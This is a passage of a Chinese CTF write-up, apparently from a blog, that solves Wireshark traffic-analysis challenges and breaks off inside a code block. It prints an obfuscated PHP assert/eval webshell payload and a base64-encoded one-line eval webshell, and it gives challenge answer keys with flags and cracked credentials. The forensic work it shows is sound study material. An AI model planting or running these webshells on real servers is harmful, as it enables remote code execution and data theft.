+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913464.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913534.png" data-fancybox="true"/></div></div>
+
+<h4 id="Misc-我抓到你了"><a href="#Misc-我抓到你了" class="headerlink" title="Misc-我抓到你了"></a>Misc-我抓到你了</h4><div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913847.png" data-fancybox="true"/></div></div>
+
+<p>打开<code>1.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="title function_ invoke__">array_map</span>(<span class="string">&quot;ass&quot;</span>.<span class="string">&quot;ert&quot;</span>,<span class="keyword">array</span>(<span class="string">&quot;ev&quot;</span>.<span class="string">&quot;Al(\&quot;\\\$xx%3D\\\&quot;Ba&quot;</span>.<span class="string">&quot;SE6&quot;</span>.<span class="string">&quot;4_dEc&quot;</span>.<span class="string">&quot;OdE\\\&quot;;@ev&quot;</span>.<span class="string">&quot;al(\\\$xx(&#x27;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JEY9Ii92YXIvd3d3L2ZsYWcuemlwIjskZnA9QGZvcGVuKCRGLCdyJyk7aWYoQGZnZXRjKCRmcCkpe0BmY2xvc2UoJGZwKTtAcmVhZGZpbGUoJEYpO31lbHNle2VjaG8oJ0VSUk9SOi8vIENhbiBOb3QgUmVhZCcpO307ZWNobygiWEBZIik7ZGllKCk7&#x27;));\&quot;);&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析</span></span><br><span class="line"><span class="string">&quot;ass&quot;</span>.<span class="string">&quot;ert&quot;</span>   <span class="comment"># assert</span></span><br><span class="line"><span class="string">&quot;ev&quot;</span>.<span class="string">&quot;AL&quot;</span>     <span class="comment"># eval</span></span><br><span class="line"><span class="variable">$xx</span>%<span class="number">3</span>D        <span class="comment">#  $xx=</span></span><br><span class="line"><span class="string">&quot;Ba&quot;</span>.<span class="string">&quot;SE6&quot;</span>.<span class="string">&quot;4_dEc&quot;</span>.<span class="string">&quot;OdE&quot;</span>   <span class="comment"># Base64_decode</span></span><br></pre></td></tr></table></figure>
+
+<p>也就是<code>Base64</code>解码,那我们也解码一下</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231913775.png" data-fancybox="true"/></div></div>
+
+<p>可以发现了<code>flag.zip</code>那我们将响应体保存为<code>zip</code>,并删除多余数据</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914538.png" data-fancybox="true"/></div></div>
+
+<h4 id="fly-pcapng"><a href="#fly-pcapng" class="headerlink" title="fly.pcapng"></a>fly.pcapng</h4><p>导出<code>HTTP</code>对象，发现是邮箱的数据传输</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914126.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914560.png" data-fancybox="true"/></div></div>
+
+<p>右键追踪流,往前翻看看是传输的什么文件<code>&#123;&quot;path&quot;:&quot;fly.rar&quot;,&quot;appid&quot;:&quot;&quot;,&quot;size&quot;:525701,&quot;md5&quot;:&quot;e023afa4f6579db5becda8fe7861c2d3&quot;,&quot;sha&quot;:&quot;ecccba7aea1d482684374b22e2e7abad2ba86749&quot;,&quot;sha3&quot;:&quot;&quot;&#125;</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914904.png" data-fancybox="true"/></div></div>
+
+<p>按照序号将五个数据包的大小记录下来,分别为<code>131436</code>、<code>131436</code>、<code>131436</code>、<code>131436</code>、<code>1777</code>一共是<code>527521Byte</code>,但是上面的大小为<code>525701</code>也就是说每个数据包前面都有固定大小的标识.<code>(527521-525701)/5=364</code>.</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914124.png" data-fancybox="true"/></div></div>
+
+<p>去掉每个数据包<code>364 byte</code>的其他头部信息,然后再将5个文件合并成<code>rar</code>压缩文件</p>
+<p>找到数据传输包，选中<code>data</code>的部分右键，导出分组字节流即可</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914725.png" data-fancybox="true"/></div></div>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/bin]</span><br><span class="line">└─$ <span class="built_in">dd</span> <span class="keyword">if</span>=1.bin bs=1 skip=364 of=1.1</span><br><span class="line">输入了 131072+0 块记录</span><br><span class="line">输出了 131072+0 块记录</span><br><span class="line">131072 字节 (131 kB, 128 KiB) 已复制，0.176974 s，741 kB/s</span><br><span class="line">┌──(kali㉿kali)-[~/bin]</span><br><span class="line">└─$ <span class="built_in">dd</span> <span class="keyword">if</span>=2.bin bs=1 skip=364 of=2.1</span><br><span class="line">输入了 131072+0 块记录</span><br><span class="line">输出了 131072+0 块记录</span><br><span class="line">131072 字节 (131 kB, 128 KiB) 已复制，0.189166 s，693 kB/s</span><br><span class="line">┌──(kali㉿kali)-[~/bin]</span><br><span class="line">└─$ <span class="built_in">dd</span> <span class="keyword">if</span>=3.bin bs=1 skip=364 of=3.1                              </span><br><span class="line">输入了 131072+0 块记录</span><br><span class="line">输出了 131072+0 块记录</span><br><span class="line">131072 字节 (131 kB, 128 KiB) 已复制，0.173329 s，756 kB/s</span><br><span class="line">┌──(kali㉿kali)-[~/bin]</span><br><span class="line">└─$ <span class="built_in">dd</span> <span class="keyword">if</span>=4.bin bs=1 skip=364 of=4.1                              </span><br><span class="line">输入了 131072+0 块记录</span><br><span class="line">输出了 131072+0 块记录</span><br><span class="line">131072 字节 (131 kB, 128 KiB) 已复制，0.182208 s，719 kB/s</span><br><span class="line">┌──(kali㉿kali)-[~/bin]</span><br><span class="line">└─$ <span class="built_in">dd</span> <span class="keyword">if</span>=5.bin bs=1 skip=364 of=5.1                              </span><br><span class="line">输入了 1413+0 块记录</span><br><span class="line">输出了 1413+0 块记录</span><br><span class="line">1413 字节 (1.4 kB, 1.4 KiB) 已复制，0.00178347 s，792 kB/s</span><br><span class="line">┌──(kali㉿kali)-[~/bin]</span><br><span class="line">└─$ <span class="built_in">ls</span></span><br><span class="line">1.1  1.bin  2.1  2.bin  3.1  3.bin  4.1  4.bin  5.1  5.bin </span><br><span class="line">┌──(kali㉿kali)-[~/bin]                                                           </span><br><span class="line">└─$ <span class="built_in">cat</span> *.1 &gt; flay.rar                                                      </span><br><span class="line">┌──(kali㉿kali)-[~/bin]                                                                   </span><br><span class="line">└─$ <span class="built_in">md5sum</span> flay.rar </span><br><span class="line">e023afa4f6579db5becda8fe7861c2d3  flay.rar  </span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914066.png" data-fancybox="true"/></div></div>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/bin]</span><br><span class="line">└─$ unrar x flay.rar </span><br><span class="line"></span><br><span class="line">UNRAR 7.00 beta 4 freeware      Copyright (c) 1993-2024 Alexander Roshal</span><br><span class="line"></span><br><span class="line">flag.txt - the file header is corrupt</span><br><span class="line"></span><br><span class="line">Extracting from flay.rar</span><br><span class="line"></span><br><span class="line">flag.txt - the file header is corrupt</span><br><span class="line">Enter password (will not be echoed) <span class="keyword">for</span> flag.txt: </span><br></pre></td></tr></table></figure>
+
+<p>可能是个伪加密,<a target="_blank" rel="noopener" href="https://blog.csdn.net/woo233/article/details/126734658">搜索rar伪加密改文件头信息解开</a>。</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914488.png" data-fancybox="true"/></div></div>
+
+
+
+<p>将<code>84</code>替换为<code>80</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914933.png" data-fancybox="true"/></div></div>
+
+<p>打开后发现是一堆乱码</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914357.png" data-fancybox="true"/></div></div>
+
+<p>使用<code>binwalk</code>分析</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914428.png" data-fancybox="true"/></div></div>
+
+<p>发现一堆图片使用<code>foremost -T flag.txt </code>进行分离</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914302.png" data-fancybox="true"/></div></div>
+
+<p>扫码可得<code>flag</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231914445.png" data-fancybox="true"/></div></div>
+
+<h4 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h4><ol>
+<li><code>flag&#123;!&quot;#$%&amp;&#39;()*+,-./0&#125;</code></li>
+<li><code>flag&#123;qscet5234diQ&#125;</code></li>
+<li><code>nctf&#123;wireshark_is_easy&#125;</code></li>
+<li><code>psw flag&#123;backdoorm8te&#125;</code></li>
+<li><code>ISG&#123;China_Ch0pper_Is_A_Slick_Little_Webshe11&#125;</code></li>
+<li><code>flag&#123;FI@G_1$_h#Re_SeC()Ri7Y&#125;</code></li>
+<li><code>flag&#123;209acebf6324a09671abc31c869de72c&#125;</code></li>
+<li><code>flag&#123;a264c8ce70dfbc08dcfb9d552e15411a&#125;</code></li>
+<li><code>flag&#123;m1Sc_oxO2_Fly&#125;</code></li>
+</ol>
+<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><ol>
+<li>某公司内网网络被黑客渗透，请分析流量，给出黑客使用的扫描器 <psw>awvs</psw></li>
+<li>某公司内网网络被黑客渗透，请分析流量，得到黑客扫描到的登陆后台是(相对路径即可) <psw>/admin/login.php?rec=login.php</psw></li>
+<li>某公司内网网络被黑客渗透，请分析流量，得到黑客使用了什么账号密码登陆了web后台(形式:username&#x2F;password) <psw>admin/admin!@#pass123</psw></li>
+<li>某公司内网网络被黑客渗透，请分析流量，得到黑客上传的webshell文件名是，内容是什么,提交webshell内容的base编码 <psw>a.php PD9waHAgQGV2YWwoJF9QT1NUWzEyMzRdKTs/Pg==</psw></li>
+<li>某公司内网网络被黑客渗透，请分析流量，黑客在robots.txt中找到的flag是什么 <psw>flag:87b7cb79481f317bde90c116cf36084b</psw></li>
+<li>某公司内网网络被黑客渗透，请分析流量，黑客找到的数据库密码是多少 <psw>web/e667jUPvJjXHvEUv</psw></li>
+<li>某公司内网网络被黑客渗透，请分析流量，被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip <psw>eth1 10.3.3.100</psw></li>
+<li>某公司内网网络被黑客渗透，请分析流量，黑客在数据库中找到的hash_code是什么 <psw>d1c029893df40cb0f47bcf8f1c3c17ac</psw></li>
+<li>某公司内网网络被黑客渗透，请分析流量，黑客破解了账号<a href="mailto:&#105;&#106;&#110;&#117;&#x40;&#x74;&#101;&#x73;&#116;&#46;&#x63;&#111;&#x6d;">&#105;&#106;&#110;&#117;&#x40;&#x74;&#101;&#x73;&#116;&#46;&#x63;&#111;&#x6d;</a>得到的密码是什么 <psw>edc123!@#</psw></li>
+<li>某公司内网网络被黑客渗透，请分析流量，黑客使用了什么账号登陆了mail系统（形式: username&#x2F;password） <psw>admin/admin!@#PASS123</psw></li>
+<li>某公司内网网络被黑客渗透，请分析流量，黑客获得的vpn的ip是多少 <psw>10.3.4.3</psw></li>
+</ol>
+<h3 id="webone-pcap"><a href="#webone-pcap" class="headerlink" title="webone.pcap"></a>webone.pcap</h3><h4 id="识别扫描器"><a href="#识别扫描器" class="headerlink" title="识别扫描器"></a>识别扫描器</h4><p>协议分级中查看到http协议<code>100%</code>,那就直接查看http协议</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407252352679.png" data-fancybox="true"/></div></div>
+
+<p>一般扫描器的指纹会出现在<code>Conten-type</code>或<code>User-Agent</code>当中,所以将此两个字段应用为列</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407252353133.png" data-fancybox="true"/></div></div>
+
+<p>大概看一下,将无危胁的过滤掉<code>http &amp;&amp; (http.request.method==&quot;GET&quot; || http.request.method==&quot;POST&quot;) &amp;&amp; http.content_type != &quot;application/x-www-form-urlencoded&quot;</code>即可发现<code>awvs</code>扫描器的指纹</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407252353293.png" data-fancybox="true"/></div></div>
+
+<h4 id="登陆后台"><a href="#登陆后台" class="headerlink" title="登陆后台"></a>登陆后台</h4><p>直接定位状态码为301或者302的,登陆成功后会跳转嘛然后可以翻到<code>admin</code>字样的数据包</p>
+<p><code>http.response.code==301 || http.response.code==302 &amp;&amp; http.response_for.uri matches &quot;admin&quot;</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407252353486.png" data-fancybox="true"/></div></div>
+
+<p>得到结果:<code>http://192.168.32.189/admin/login.php?rec=login.php</code></p>
+<h4 id="账号密码"><a href="#账号密码" class="headerlink" title="账号密码"></a>账号密码</h4><p>基本查询没什么好讲的,把长度排序,最特别的那个就很有可能是登录成功的,我们使用Burp爆破的时候也是看长度最特别的那个</p>
+<p><code>http.request.method==&quot;POST&quot; &amp;&amp; http.request.uri.query==&quot;rec=login&quot;&amp;&amp; ip.src==192.168.94.59</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407252353319.png" data-fancybox="true"/></div></div>
+
+<h4 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h4><p>木马一般请求方式为<code>POST</code>,所以指定请求方式为<code>POST</code>.并且将暴力破解相关的流量筛选掉</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http &amp;&amp; ip.src == 192.168.94.59 &amp;&amp; http.request.method == <span class="string">&quot;POST&quot;</span> &amp;&amp; http.content_type!=<span class="string">&quot;acunetix/wvs&quot;</span> &amp;&amp;!(http.request.full_uri contains <span class="string">&quot;admin/login.php?rec=login&quot;</span>)</span><br><span class="line">&amp;&amp; !(http.request.full_uri contains <span class="string">&quot;/admin/login.php?rec&quot;</span>)&amp;&amp; !(http.request.full_uri contains <span class="string">&quot;css&quot;</span>)&amp;&amp; !(http.request.full_uri contains <span class="string">&quot;js&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以发现比较异常的文件:<code>a.php</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407252353551.png" data-fancybox="true"/></div></div>
+
+<p>然后我们发现了密码是1234,并且是在请求体里的则根据此条件找出木马内容.使用<code>http contains &quot;$_POST[1234]&quot; </code>发现搜不到,那么尝试一下tcp,<code>tcp contains &quot;$_POST[1234]&quot;</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407252353647.png" data-fancybox="true"/></div></div>
+
+<h4 id="分析WebShell行为"><a href="#分析WebShell行为" class="headerlink" title="分析WebShell行为"></a>分析WebShell行为</h4><p>定位<code>WebShell</code>相关的所有流量<code>http.request.uri==&quot;/images/article/a.php&quot; || http.response_for.uri  matches &quot;/images/article/a.php&quot;</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271053145.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271053653.png" data-fancybox="true"/></div></div>
+
+<p>选择导出特定分组打开导出的文件进行追流分析</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 